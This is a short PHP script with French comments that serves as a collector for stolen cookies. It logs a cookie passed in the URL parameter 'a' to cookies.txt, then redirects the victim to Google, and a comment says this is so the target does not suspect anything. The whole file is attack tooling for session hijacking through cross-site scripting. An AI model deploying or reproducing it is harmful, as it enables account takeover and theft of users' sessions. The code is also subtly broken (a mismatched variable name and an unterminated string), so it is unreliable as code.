<?php
$cookie = $_GET['a']; // on reconnaît a en variable GET
if($cookie)
{
$fp = fopen('cookies.txt','a'); // On ouvre cookies.txt en edition
fputs($fp,$cook . '\r\n');

// On écrit le contenu du cookie sur une nouvelle ligne
fclose($fp); // On ferme le fichier cookies.txt
}?>
<script>
location.replace('http://www.google.fr);
// Rediriger la cible vers google.ma pour qu'il ne se doute de rien
</script>